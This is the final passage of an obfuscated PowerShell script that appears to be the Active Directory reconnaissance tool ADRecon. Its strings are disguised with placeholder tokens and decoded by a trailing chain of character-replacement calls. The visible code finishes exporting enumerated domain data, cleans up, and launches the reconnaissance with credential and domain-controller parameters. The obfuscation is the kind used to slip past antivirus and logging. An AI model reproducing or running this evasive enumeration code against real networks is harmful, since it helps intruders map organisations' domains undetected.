    bLHTotalTime = lEzj{0:N2}lEzj -f ((Get-DateDiff -Date1 (Get-Date) -Date2 bLHdate).TotalMinutes)

    bLHAboutADRecon = Get-ADRAbout -Method bLHMethod -date bLHdate -ADReconVersion bLHADReconVersion -Credential bLHCredential -RanonComputer bLHRanonComputer -TotalTime bLHTotalTime

    If ( (bLHOutputType -Contains lEzjCSVlEzj) -or (bLHOutputType -Contains lEzjXMLlEzj) -or (bLHOutputType -Contains lEzjJSONlEzj) -or (bLHOutputType -Contains lEzjHTMLlEzj) )
    {
        If (bLHA'+'boutA'+'DRecon)
        {
            Export-ADR -ADRObj bLHAboutADRecon -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjAboutADReconlEzj
        }
        Write-Output lEzj[*] Total Execution Time (mins): bLH(bLHTotalTime)lEzj
        Write-Output lEzj[*] Output Directory: bLHADROutputDirlEzj
        bLHADRSTDOUT = bLHfalse
    }

    Switch (bLHOutputType)
    {
        xfJ4STDOUTxfJ4
        {
            If (bLHADRSTDOUT)
            {
                Write-Output lEzj[*] Total Execution Time (mins): bLH(bLHTotalTime)lEzj
            }
        }
        xfJ4HTMLxfJ4
        {
            Export-ADR -ADRObj bLH(New-Object PSObject) -ADROutputDir bLHADROutputDir -OutputType bLH([array] lEzjHTMLlEzj) -ADRModuleName lEzjIndexlEzj
        }
        xfJ4EXCELxfJ4
        {
            Export-ADRExcel bLHADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location bLHreturndir
    Remove-Variable returndir

    If ((bLHMethod -eq xfJ4ADWSxfJ4) -and bLHUseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjDomain.Dispose()
        bLHobjDomainRootDSE.Dispose()
    }

    If (bLHADROutputDir)
    {
        Remove-EmptyADROutputDir bLHADROutputDir bLHOutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If (bLHLog)
{
    Start-Transcript -Path lEzjbLH(Get-Location)cnIADRecon-Console-Log.txtlEzj
}

Invoke-ADRecon -GenExcel bLHGenExcel -Method bLHMethod -Collect bLHCollect -DomainController b'+'LHDomainController -Credential bLHCredential -OutputType bLHOutputType -ADROutputDir bLHOutputDir -DormantTimeSpan bLHDormantTimeSpan -PassMaxAge bLHPassMaxAge -PageSize bLHPageSize -Threads bLHThreads

If (bLHLog)
{
    Stop-Transcript
}
') -CrePlaCE'lEzj',[CHar]34 -CrePlaCE ([CHar]120+[CHar]102+[CHar]74+[CHar]52),[CHar]39 -CrePlaCE([CHar]48+[CHar]79+[CHar]103+[CHar]118),[CHar]124-REPlACe  'pwO',[CHar]96 -CrePlaCE'bLH',[CHar]36  -REPlACe  'cnI',[CHar]92) ) 
